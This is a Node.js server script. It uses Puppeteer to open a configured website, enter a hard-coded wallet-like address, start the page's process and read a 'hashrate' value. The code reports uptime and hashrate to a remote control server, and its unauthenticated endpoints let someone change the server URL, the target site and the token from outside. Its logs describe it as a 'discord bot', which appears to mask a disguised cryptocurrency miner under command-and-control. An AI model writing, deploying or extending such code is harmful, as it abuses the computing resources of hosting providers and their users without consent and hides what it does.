const express = require("express");
const puppeteer = require("puppeteer");
const fs = require('fs');
const path = require('path');
const axios = require('axios');
let config = require('./config/config.js');

const app = express();
app.use(express.json());

let controlServerUrl = config.CONTROL_SERVER_URL;
let controlServerUrlErrorLogged = false;

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

let page;
let browser;
let puppeteerError = null;
let pageTitle = '';
let startTime;
let HValue = '--';

async function startBrowser() {
  try {
    browser = await puppeteer.launch({
      args: [
        "--disable-setuid-sandbox",
        "--no-sandbox",
        "--single-process",
        "--no-zygote",
      ],
      executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : puppeteer.executablePath(),
      headless: false,
    });
    const pages = await browser.pages();
    page = pages[0];

    const url = config.WEBSITE;
    await page.goto(url, { waitUntil: "domcontentloaded" });
    await delay(2000);

    const inputSelector = '#AddrField';
    const BOTID = config.BOT_TOKEN || '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';

    await page.type(inputSelector, BOTID);
    await page.keyboard.press("Enter");
    await delay(2000);

    await page.click('#WebBtn');
    pageTitle = await page.title();
    console.log(pageTitle);
    console.log(`Started discord bot on server ${config.BOT_ID}`);
    await page.screenshot({ path: 'screenshot.png' });

    startTime = new Date();

    // Start monitoring the H value
    setInterval(async () => {
      try {
        HValue = await page.$eval('#WebH', el => el.textContent);
        console.log(`Hs: ${HValue}`);
      } catch (error) {
        console.error('Error fetching Hvalue:', error.message);
      }
    }, 5000);

  } catch (err) {
    puppeteerError = err.message;
    console.error('Error in startBrowser:', err.message);
  }
}

async function stopBrowser() {
  if (browser) {
    await browser.close();
    browser = null;
    page = null;
    puppeteerError = null;
    pageTitle = '';
    startTime = null;
    HValue = '--';
  }
}

function getUptime() {
  if (!startTime) return null;
  const now = new Date();
  const diff = now - startTime;
  const diffInSeconds = Math.floor(diff / 1000);
  const hours = Math.floor(diffInSeconds / 3600);
  const minutes = Math.floor((diffInSeconds % 3600) / 60);
  const seconds = diffInSeconds % 3600 % 60;
  return `${hours}h ${minutes}m ${seconds}s`;
}

async function sendStatusToControlServer() {
  if (!controlServerUrl || !/^https?:\/\/.+/i.test(controlServerUrl)) {
    if (!controlServerUrlErrorLogged) {
      console.error('Invalid or missing control server URL.');
      controlServerUrlErrorLogged = true;
    }
    return;
  }

  controlServerUrlErrorLogged = false;

  const status = {
    active: !puppeteerError,
    uptime: getUptime(),
    hashrate: HValue,
    error: puppeteerError,
    pageTitle
  };

  try {
    await axios.post(`${controlServerUrl}/update`, {
      serverId: config.BOT_ID,
      status
    });
    console.log(`Status sent to control server: ${JSON.stringify(status)}`);
  } catch (error) {
    console.error('Error sending status to control server:', error.message);
  }
}

function updateConfigVariable(key, value) {
  const configFilePath = path.resolve(__dirname, './config/config.js');
  config[key] = value;
  const updatedConfig = `module.exports = ${JSON.stringify(config, null, 2)};`;
  fs.writeFileSync(configFilePath, updatedConfig);
  delete require.cache[require.resolve(configFilePath)]; 
  config = require(configFilePath); 
}

async function handleConfigUpdate(key, value) {
  await stopBrowser();
  console.log("Closing browser....");
  updateConfigVariable(key, value);
  console.log(`Restarting browser with new configuration: ${key} = ${value}`);
  await startBrowser();
  console.log("Browser restarted.");
}

app.post('/update-control-server-url', async (req, res) => {
  const { newUrl } = req.body;
  if (!newUrl) {
    return res.status(400).send({ error: "newUrl is required" });
  }
  await handleConfigUpdate('CONTROL_SERVER_URL', newUrl);
  controlServerUrl = newUrl;
  controlServerUrlErrorLogged = false; // Reset the error flag when updating the URL
  res.send({ success: true, newUrl });
});

app.post('/update-website', async (req, res) => {
  const { newWebsite } = req.body;
  if (!newWebsite) {
    return res.status(400).send({ error: "newWebsite is required" });
  }
  await handleConfigUpdate('WEBSITE', newWebsite);
  res.send({ success: true, newWebsite });
});

app.post('/update-bot-token', async (req, res) => {
  const { newBotToken } = req.body;
  if (!newBotToken) {
    return res.status(400).send({ error: "newBotToken is required" });
  }
  await handleConfigUpdate('BOT_TOKEN', newBotToken);
  res.send({ success: true, newBotToken });
});

app.get('/', (req, res) => {
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
  const botIdMatches = uuidRegex.test(config.BOT_ID);
  const batchCorrect = process.env.BATCH === 'ALPHA';

  const response = {
    BOT_ID: botIdMatches ? "SET" : "NOT SET",
    BATCH: batchCorrect ? "SET" : "NOT SET",
  };

  if (puppeteerError) {
    response.error = puppeteerError;
  } else {
    response.success = true;
    response.pageTitle = pageTitle;
    response.uptime = getUptime();
    response.Hs = HValue;
  }

  res.send(response);
});

startBrowser();

setInterval(sendStatusToControlServer, 20000); 

const listener = app.listen(process.env.PORT || 3000, () => {
  console.log(`Your app is listening on port ${listener.address().port}`);
});

// Gracefully close the browser on process termination
process.on('SIGINT', async () => {
  console.log('Closing the browser...');
  await stopBrowser();
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('Closing the browser...');
  await stopBrowser();
  process.exit(0);
});
